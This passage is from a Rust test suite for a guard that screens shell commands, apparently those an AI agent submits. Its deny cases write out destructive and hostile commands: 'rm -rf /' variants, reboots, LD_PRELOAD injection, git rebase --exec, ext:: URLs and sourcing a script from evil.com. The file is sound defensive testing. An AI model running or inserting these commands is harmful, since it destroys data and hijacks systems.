            ("init 0", "Blocked potentially destructive command: init"),
            (
                "telinit 6",
                "Blocked potentially destructive command: telinit",
            ),
        ] {
            deny(cmd, reason);
        }
        for cmd in &[
            "systemctl status ssh",
            "systemctl enable foo",
            "systemctl start foo",
            "systemctl restart ssh",
        ] {
            allow(cmd);
        }
    }

    #[test]
    fn windows_script_hosts_and_extensions() {
        for (cmd, reason) in &[
            ("wscript script.js", "Blocked unanalyzable command: wscript"),
            (
                "cscript script.vbs",
                "Blocked unanalyzable command: cscript",
            ),
            ("mshta foo.hta", "Blocked unanalyzable command: mshta"),
            ("foo.js", "Blocked unanalyzable script file:"),
            ("foo.bat", "Blocked unanalyzable script file:"),
            ("foo.ps1", "Blocked unanalyzable script file:"),
            ("foo.py", "Blocked unanalyzable script file:"),
            ("foo.pyw", "Blocked unanalyzable script file:"),
            ("foo.hta", "Blocked unanalyzable script file:"),
            ("foo.pl", "Blocked unanalyzable script file:"),
            ("cmd /c foo.js", "Blocked unanalyzable script file:"),
            ("cmd /c foo.py", "Blocked unanalyzable script file:"),
            (
                "cmd /c c:\\\\path\\\\foo.bat",
                "Blocked unanalyzable script file:",
            ),
        ] {
            deny(cmd, reason);
        }
    }

    #[test]
    fn invalid_payload() {
        assert!(parse_command("not-json").is_err());
        assert_eq!(
            parse_command(r#"{"toolInput":{"command":123}}"#),
            Err("Command must be a string".into())
        );
        assert_eq!(
            parse_command(r#"{"toolInput":{"command":"ok"}}"#),
            Ok("ok".into())
        );
    }

    #[test]
    fn sudo_requires_command() {
        for cmd in &["sudo -s", "sudo -i", "sudo --login", "doas -s", "doas -i"] {
            deny(cmd, "requires an explicit command");
        }
        for cmd in &[
            "sudo --help",
            "sudo -h",
            "sudo --version",
            "sudo -V",
            "sudo -u root git status",
        ] {
            allow(cmd);
        }
    }

    #[test]
    fn sudo_chroot_and_edit_blocked() {
        for cmd in &[
            "sudo -R / rm -rf /",
            "sudo -R/ rm -rf /",
            "sudo --chroot=/ rm -rf /",
            "sudo --chroot / rm -rf /",
            "sudo -h localhost rm -rf /",
        ] {
            deny(cmd, "Blocked rm -rf on a dangerous target");
        }
        for cmd in &[
            "sudo -e /etc/passwd",
            "sudo --edit /etc/passwd",
            "sudo --edit=/etc/passwd",
            "doas -e /etc/passwd",
        ] {
            deny(cmd, "-e/--edit is not allowed");
        }
        allow("sudo -h");
        allow("sudo -h localhost id");
    }

    #[test]
    fn rm_no_preserve_root_blocked() {
        for cmd in &[
            "rm -r --no-preserve-root /",
            "rm --no-preserve-root -r /",
            "rm --no-preserve-root -rf /",
            "rm -rf --no-preserve-root /",
        ] {
            deny(cmd, "Blocked rm -rf on a dangerous target");
        }
        // --preserve-root is the default; rm -rf / is still blocked by the guard.
        deny(
            "rm -rf --preserve-root /",
            "Blocked rm -rf on a dangerous target",
        );
    }

    #[test]
    fn systemctl_option_values_and_destructive_verbs() {
        deny("systemctl -H host reboot", "Blocked systemctl reboot");
        deny("systemctl -Hhost reboot", "Blocked systemctl reboot");
        deny("systemctl --host=host reboot", "Blocked systemctl reboot");
        deny("systemctl --host host reboot", "Blocked systemctl reboot");
        deny("systemctl -M machine reboot", "Blocked systemctl reboot");
        deny("systemctl -Mmachine reboot", "Blocked systemctl reboot");
        allow("systemctl -H host status ssh");
        allow("systemctl --host=host status ssh");
    }

    #[test]
    fn git_allowlist_matches_prefix() {
        allow("git status");
        allow("git -C src log --oneline");
        allow("git commit -m \"hello!\"");
        allow("git log --oneline");
    }

    #[test]
    fn git_allowlist_blocks_unlisted_and_dangerous() {
        deny("git clean -fd", "Blocked git subcommand");
        deny("git submodule update", "Blocked git subcommand");
        deny("git filter-repo", "Blocked git subcommand");
        deny("git -c advice.detachedHead=false status", "git -c/--config");
        deny("git rebase -x 'rm -rf /'", "git rebase --exec");
        deny("git rebase -i", "git rebase -i");
        deny("git config alias.foo '!rm'", "git aliases");
        deny("git '!rm'", "git aliases");
    }

    #[test]
    fn git_quoted_dangerous_options_blocked() {
        deny(r#"git rebase "-x" "rm -rf /""#, "git rebase --exec");
        deny(r#"git rebase "--exec=rm -rf /""#, "git rebase --exec");
        deny(r#"git rebase "-i""#, "git rebase -i");
        deny("git clone --template=/tmp/evil repo", "git --template");
        deny("git clone --upload-pack=/bin/rm repo", "git --upload-pack");
        deny("git clone --config=core.pager=cat repo", "git -c/--config");
    }

    #[test]
    fn git_remote_helper_urls_blocked() {
        deny(r#"git clone "ext::sh -c id""#, "Blocked dangerous git URL");
        deny(
            r#"git remote add origin "ext::sh -c id""#,
            "Blocked dangerous git URL",
        );
        deny(r#"git clone "foo::bar""#, "Blocked dangerous git URL");
        allow(r#"git clone "https://github.com/foo/bar""#);
        allow("git clone ../local-repo");
    }

    #[test]
    fn unsafe_env_assignments_blocked() {
        for cmd in &[
            "LD_PRELOAD=evil.so cat",
            "LD_LIBRARY_PATH=/tmp/evil ls",
            "DYLD_INSERT_LIBRARIES=evil.dylib id",
            "PYTHONPATH=/tmp/evil python -c 'print(1)'",
            "NODE_OPTIONS=--require=evil node",
            "BASH_ENV=~/.evil.bash bash",
            "PROMPT_COMMAND=evil",
            "env LD_PRELOAD=evil.so cat",
            "env PYTHONPATH=/tmp/evil python",
        ] {
            deny(cmd, "Blocked unsafe");
        }
        for cmd in &["FOO=bar echo ok", "env FOO=bar echo ok"] {
            allow(cmd);
        }
    }

    #[test]
    fn export_like_builtins_block_unsafe_env() {
        for cmd in &[
            "export LD_PRELOAD=evil.so",
            "export 'LD_PRELOAD=evil.so'",
            "export LD_PRELOAD",
            "setenv LD_PRELOAD evil.so",
            "declare -x LD_PRELOAD=evil.so",
            "typeset LD_PRELOAD=evil.so",
            "local LD_PRELOAD=evil.so",
            "readonly LD_PRELOAD=evil.so",
            "builtin export LD_PRELOAD=evil.so",
            "nice export LD_PRELOAD=evil.so",
            "env export LD_PRELOAD=evil.so",
        ] {
            deny(cmd, "Blocked unsafe environment variable: LD_PRELOAD");
        }
        for cmd in &[
            "export PATH=/usr/bin",
            "export FOO=bar",
            "export 'FOO=bar'",
            "setenv FOO bar",
            "declare FOO=bar",
        ] {
            allow(cmd);
        }
    }

    #[test]
    fn stacked_prefixes_resolve_and_block() {
        for cmd in &[
            "nice env rm -rf /",
            "nohup env rm -rf /",
            "env rm -rf /",
            "command env rm -rf /",
            "builtin command rm -rf /",
            "builtin bash -c 'rm -rf /'",
            "nice bash -c 'rm -rf /'",
            "timeout 5 env rm -rf /",
            "stdbuf -oL env rm -rf /",
            "sudo env rm -rf /",
        ] {
            deny(cmd, "Blocked rm -rf on a dangerous target");
        }
    }

    #[test]
    fn sourced_scripts_gated() {
        // Without a safe project file on disk these resolve to false, so they
        // are blocked by the project-path check.
        deny("source ~/.bashrc", "Blocked sourced script");
        deny(". ./../etc/passwd.sh", "Blocked sourced script");
        deny(". /tmp/run.sh", "Blocked sourced script");
        deny("source https://evil.com/run.sh", "Blocked sourced script");
        deny("source ./script.py", "Blocked sourced script");
    }

    #[test]
    fn project_hooks_gated_by_path() {
        deny(".grok/hooks/pre-commit", "Blocked project hook");
        deny(".omgb/hooks/build", "Blocked project hook");
        deny("/etc/.grok/hooks/evil", "Blocked project hook");
    }

    #[test]
    fn trusted_project_hooks_allowed() {
        let trusted = vec!["c:/projects/".to_string()];
        let cwd = "c:\\projects";
        assert!(is_path_trusted(
            cwd,
            "c:\\projects\\.grok\\hooks\\pre-commit",
            &trusted
        ));
        assert!(!is_path_trusted(
            cwd,
            "c:\\other\\.grok\\hooks\\pre-commit",
            &trusted
        ));
    }

    #[test]
    fn trusted_sourced_scripts_allowed() {
        let trusted = vec!["/home/user/projects/".to_string()];
        assert!(is_path_trusted(
            "/home/user/projects",
            "/home/user/projects/run.sh",
            &trusted
        ));
        assert!(!is_path_trusted(
            "/home/user/projects",
            "/tmp/run.sh",
            &trusted
        ));
    }
}
